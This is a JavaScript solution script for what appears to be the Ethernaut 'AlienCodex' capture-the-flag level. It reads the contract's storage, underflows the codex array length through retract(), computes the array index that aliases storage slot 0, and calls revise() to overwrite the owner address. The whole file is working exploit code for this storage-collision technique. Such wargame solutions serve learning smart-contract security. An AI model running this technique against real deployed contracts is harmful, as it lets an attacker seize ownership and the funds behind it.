const loader = require('../loader.js')
const web3 = require('../web3.js')
let instance = require('../prompt.js');

(async () => {
  try {
    // Deploy new instance if nothing entered at prompt
    if (instance === '') {
      console.log()
      console.log('Create new level instance...')
      const bytecode = '0xdfc86b17000000000000000000000000f0d6f7da4ed4ff54761841e497f5afc795f04688'
      const levelFactory = '0xF912dE5f8d0dac8cA70c9F4a0d460950e9537850'
      const tx = await web3.eth.sendTransaction({ to: levelFactory, data: bytecode })
      instance = tx.logs[0].address
      console.log(`Instance: ${instance}`)
    }

    console.log()
    console.log('Load victim contract.')
    const victim = loader.web3.fromArtifact('AlienCodex', instance)

    console.log('Get storage at slot 0 and 1...')
    let slot0 = await web3.eth.getStorageAt(instance, 0)
    let slot1 = await web3.eth.getStorageAt(instance, 1)
    console.log('slot 0:')
    console.log(slot0)
    const contact = +slot0.slice(2 * 12 + 1, 2 * 12 + 2)
    // let owner = slot0.slice(-20 * 2)
    let owner = await victim.methods.owner().call()
    console.log(`contact: ${contact}`)
    console.log(`owner: ${owner}`)
    console.log()
    console.log('slot 1:')
    console.log(slot1)
    let length = web3.utils.hexToNumberString(slot1)
    console.log(`Codex length: ${length}`)

    // make contact
    console.log()
    console.log('Check contact...')
    if (contact !== '1') {
      console.log('Make contact...')
      await victim.methods.make_contact().send()
      console.log('New slot0')
      slot0 = await web3.eth.getStorageAt(instance, 0)
      console.log(`${slot0}`)
    } else {
      console.log('Contact already established')
    }

    console.log()
    if (length == 0) {
      console.log('Codex length is 0 --> cause underflow by calling retract()...')
      await victim.methods.retract().send()
      slot1 = await web3.eth.getStorageAt(instance, 1)
      length = web3.utils.hexToNumberString(slot1)
      console.log('New slot 1:')
      console.log(slot1)
      console.log(`New codex length: ${length}`)
    }

    console.log()
    console.log('Deploy HackAlienCodex...')
    let attacker = loader.web3.fromArtifact('HackAlienCodex')
    const { options: { address } } = await attacker.deploy().send()
    attacker = loader.web3.fromArtifact('HackAlienCodex', address)

    console.log('Calculate codex index corresponding to slot 0 (2^256 - uint(sha(3))')
    const index = await attacker.methods.getIndex().call()
    console.log(`Codex index is: ${index}`)

    console.log()
    console.log('Call revise() to modify codex at this particular index...')
    const content = web3.utils.padLeft(web3.eth.defaultAccount, 64)
    await victim.methods.revise(index, content).send()

    console.log()
    owner = await victim.methods.owner().call()
    console.log(`owner is now ${owner}`)
    console.log('Hack Done.')
  } catch (err) {
    console.log(err.message)
  }
})()
